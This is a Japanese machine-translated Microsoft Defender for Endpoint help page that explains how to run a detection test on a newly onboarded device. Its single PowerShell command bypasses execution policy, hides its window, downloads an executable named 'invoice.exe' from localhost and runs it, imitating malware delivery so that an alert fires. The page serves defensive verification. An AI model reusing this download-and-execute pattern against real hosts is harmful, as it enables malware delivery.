---
title: 新しくオンボードされた Microsoft Defender ATP デバイスで検出テストを実行する
description: 新しくオンボードされたデバイスで検出スクリプトを実行して、Microsoft Defender ATP サービスに正しくオンボードされていることを確認します。
keywords: 検出テスト、検出、powershell、スクリプト、検証、オンボーディング、エンドポイントオンボーディング用 Microsoft Defender、クライアント、サーバー、テスト
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 10154a734bb4c3d8b26fffb8618484aeb11f907a
ms.sourcegitcommit: 956176ed7c8b8427fdc655abcd1709d86da9447e
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 03/23/2021
ms.locfileid: "51066092"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a><span data-ttu-id="da333-104">新しくオンボードされた Microsoft Defender for Endpoint デバイスで検出テストを実行する</span><span class="sxs-lookup"><span data-stu-id="da333-104">Run a detection test on a newly onboarded Microsoft Defender for Endpoint device</span></span> 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


<span data-ttu-id="da333-105">**適用対象:**</span><span class="sxs-lookup"><span data-stu-id="da333-105">**Applies to:**</span></span>
- <span data-ttu-id="da333-106">サポートされている Windows 10 バージョン</span><span class="sxs-lookup"><span data-stu-id="da333-106">Supported Windows 10 versions</span></span>
- <span data-ttu-id="da333-107">Windows Server 2012 R2</span><span class="sxs-lookup"><span data-stu-id="da333-107">Windows Server 2012 R2</span></span>
- <span data-ttu-id="da333-108">Windows Server 2016</span><span class="sxs-lookup"><span data-stu-id="da333-108">Windows Server 2016</span></span>
- <span data-ttu-id="da333-109">Windows Server バージョン 1803</span><span class="sxs-lookup"><span data-stu-id="da333-109">Windows Server, version 1803</span></span>
- <span data-ttu-id="da333-110">Windows Server、 2019</span><span class="sxs-lookup"><span data-stu-id="da333-110">Windows Server, 2019</span></span>
- [<span data-ttu-id="da333-111">Microsoft Defender for Endpoint</span><span class="sxs-lookup"><span data-stu-id="da333-111">Microsoft Defender for Endpoint</span></span>](https://go.microsoft.com/fwlink/?linkid=2154037)
- [<span data-ttu-id="da333-112">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="da333-112">Microsoft 365 Defender</span></span>](https://go.microsoft.com/fwlink/?linkid=2118804)

> <span data-ttu-id="da333-113">Microsoft Defender for Endpoint を体験してみませんか?</span><span class="sxs-lookup"><span data-stu-id="da333-113">Want to experience Microsoft Defender for Endpoint?</span></span> [<span data-ttu-id="da333-114">無料試用版にサインアップします。</span><span class="sxs-lookup"><span data-stu-id="da333-114">Sign up for a free trial.</span></span>](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

<span data-ttu-id="da333-115">新しくオンボードされたデバイスで次の PowerShell スクリプトを実行して、Defender for Endpoint サービスに適切に報告されていることを確認します。</span><span class="sxs-lookup"><span data-stu-id="da333-115">Run the following PowerShell script on a newly onboarded device to verify that it is properly reporting to the Defender for Endpoint service.</span></span>

1. <span data-ttu-id="da333-116">フォルダーを作成する: 'C:\test-MDATP-test'。</span><span class="sxs-lookup"><span data-stu-id="da333-116">Create a folder:  'C:\test-MDATP-test'.</span></span>
2. <span data-ttu-id="da333-117">デバイスで管理者特権のコマンド ライン プロンプトを開き、スクリプトを実行します。</span><span class="sxs-lookup"><span data-stu-id="da333-117">Open an elevated command-line prompt on the device and run the script:</span></span>

   1. <span data-ttu-id="da333-118">**[スタート]** をクリックし、「**cmd**」と入力します。</span><span class="sxs-lookup"><span data-stu-id="da333-118">Go to **Start** and type **cmd**.</span></span>

   1. <span data-ttu-id="da333-119">[コマンド プロンプト] を **右クリックし、[** 管理者として **実行] を選択します**。</span><span class="sxs-lookup"><span data-stu-id="da333-119">Right-click **Command Prompt** and select **Run as administrator**.</span></span>

      ![[ウィンドウのスタート] メニューの [管理者として実行] をポイントする](images/run-as-admin.png)

3. <span data-ttu-id="da333-121">プロンプトで、次のコマンドをコピーして実行します。</span><span class="sxs-lookup"><span data-stu-id="da333-121">At the prompt, copy and run the following command:</span></span>

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

<span data-ttu-id="da333-122">[コマンド プロンプト] ウィンドウが自動的に閉じます。</span><span class="sxs-lookup"><span data-stu-id="da333-122">The Command Prompt window will close automatically.</span></span> <span data-ttu-id="da333-123">成功した場合、検出テストは完了としてマークされ、約 10 分でオンボード デバイスのポータルに新しいアラートが表示されます。</span><span class="sxs-lookup"><span data-stu-id="da333-123">If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded device in approximately 10 minutes.</span></span>

## <a name="related-topics"></a><span data-ttu-id="da333-124">関連項目</span><span class="sxs-lookup"><span data-stu-id="da333-124">Related topics</span></span>
- [<span data-ttu-id="da333-125">オンボード Windows 10 デバイス</span><span class="sxs-lookup"><span data-stu-id="da333-125">Onboard Windows 10 devices</span></span>](configure-endpoints.md)
- [<span data-ttu-id="da333-126">オンボード サーバー</span><span class="sxs-lookup"><span data-stu-id="da333-126">Onboard servers</span></span>](configure-server-endpoints.md)
- [<span data-ttu-id="da333-127">Microsoft Defender for Endpoint オンボーディングの問題のトラブルシューティング</span><span class="sxs-lookup"><span data-stu-id="da333-127">Troubleshoot Microsoft Defender for Endpoint onboarding issues</span></span>](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
